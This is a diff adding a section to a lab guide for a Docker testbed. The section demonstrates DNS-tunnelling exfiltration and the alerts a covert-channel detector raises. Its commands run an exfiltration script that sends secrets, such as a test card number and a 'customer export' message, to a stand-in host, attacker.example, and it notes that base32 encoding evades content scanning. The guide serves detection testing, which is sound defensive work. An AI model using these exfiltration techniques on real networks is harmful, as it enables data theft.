@@ -101,3 +101,89 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
   │          (threshold: 4)                                                      │
   │ Details  count=6   window_seconds=1.0   threshold=4   source_ip=172.20.0.3   │
   ╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+## 3. Covert Channel Scenarios (DNS Tunneling)
+
+The DNS attack script builds its own queries with the standard library (no
+scapy) and sends them straight at the attacker's DNS sink; they traverse the
+gateway, where the passive covert-detector inspects each QNAME. Make sure the
+DNS sink is running (Terminal 3): `docker compose exec attacker python servers/dns_sink.py`.
+
+> **Note:** the volume rule (`DNS_TUNNEL_VOLUME`) is stateful over a 60 s sliding
+> window per source+apex, so unique-subdomain counts accumulate across runs. If
+> you run several DNS scenarios back-to-back it may trip earlier than the panels
+> below. For output that matches this guide exactly (especially 3.4), run on an
+> idle detector or reset state first: `docker compose restart covert-detector`.
+
+### 3.1 Benign DNS Lookup (Baseline Pass-Through)
+
+- **Command (Victim):**
+  ```bash
+  docker compose exec victim python attacks/dns_exfiltrate.py --secret "hello world" --mode naive
+  ```
+
+- **Expected:** one short, readable query (`c0.hello-world.exfil.attacker.example`)
+  reaches the sink; **0 DLP alerts** in `covert-detector` (stays under the length,
+  entropy, and volume thresholds and carries no sensitive content).
+
+
+### 3.2 Cleartext Sensitive Data (L7 Content Inspection on the QNAME)
+
+- **Command (Victim):**
+  ```bash
+  docker compose exec victim python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" --mode naive
+  ```
+
+- **Expected Alerts in `covert-detector`:**
+  ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
+  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
+  │ Details  qname=c0.VISA-4111111111111111.exfil.attacker.example   qtype=A     │
+  │          longest_label=21   qname_len=47                                     │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
+  ╭─ ⚠  HIGH DNS_SENSITIVE_DATA_LUHN_CC  ALLOWED  ──────────────────────────────╮
+  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
+  │ Details  qname=c0.VISA-4111111111111111.exfil.attacker.example   qtype=A     │
+  │          matched=4111111111111111   detector=luhn   source=dns_qname         │
+  │          l7_rule_id=luhn_cc   digits=16   issuing_network=Visa               │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+### 3.3 Encoded Tunnel (High-Entropy Labels)
+
+- **Command (Victim):**
+  ```bash
+  docker compose exec victim python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" --mode base32
+  ```
+
+- **Expected Alerts in `covert-detector`:** base32 defeats the cleartext content
+  scan, but the random-looking label still trips the entropy and length rules.
+  ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
+  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
+  │ Details  qname=c0.kzevgqjagqytcmjrgeytcmjrgeytcm.exfil.attacker.example      │
+  │          qtype=A   longest_label=30   qname_len=56                           │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
+  ╭─ ⚠  HIGH DNS_HIGH_ENTROPY  ALLOWED  ────────────────────────────────────────╮
+  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
+  │ Details  qname=c0.kzevgqjagqytcmjrgeytcmjrgeytcm.exfil.attacker.example      │
+  │          qtype=A   entropy=3.939   payload_len=37                            │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+### 3.4 High-Volume Tunnel (Behavioral Volume Rule)
+
+- **Command (Victim):**
+  ```bash
+  docker compose exec victim python attacks/dns_exfiltrate.py \
+    --secret "CONFIDENTIAL CUSTOMER EXPORT: 500 records of PII and card numbers attached" \
+    --mode base32 --chunk-size 10
+  ```
+
+- **Expected Alert in `covert-detector`:** small chunks spread the payload across
+  many unique subdomains under one apex; once eight distinct subdomains appear in
+  the 60 s window, the volume rule fires (alongside per-query entropy alerts).
+  ╭─ ⚠  HIGH DNS_TUNNEL_VOLUME  ALLOWED  ───────────────────────────────────────╮
+  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
+  │ Details  qname=c7.rakbeusidb.exfil.attacker.example   qtype=A                │
+  │          unique_subdomains=8   window_sec=60.0                               │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
